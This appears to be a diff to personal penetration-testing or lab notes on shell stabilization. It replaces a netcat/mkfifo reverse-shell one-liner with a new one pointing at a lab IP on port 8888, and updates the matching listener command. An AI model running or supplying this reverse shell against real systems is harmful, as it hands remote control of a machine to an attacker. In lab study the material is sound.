@@ -4,7 +4,7 @@ For the [Shell Stabilization](Shell%20Stabilization.md) first we need to execute
 
 First type `shell` then enter, now:
 
-- On the unstable shell `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.115 4444 >/tmp/f`
-- On attacking system `nc -lvnp 1337`
+- On the unstable shell `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.168 8888 >/tmp/f`
+- On attacking system `nc -lvnp 8888`
 
 then Stabilize.
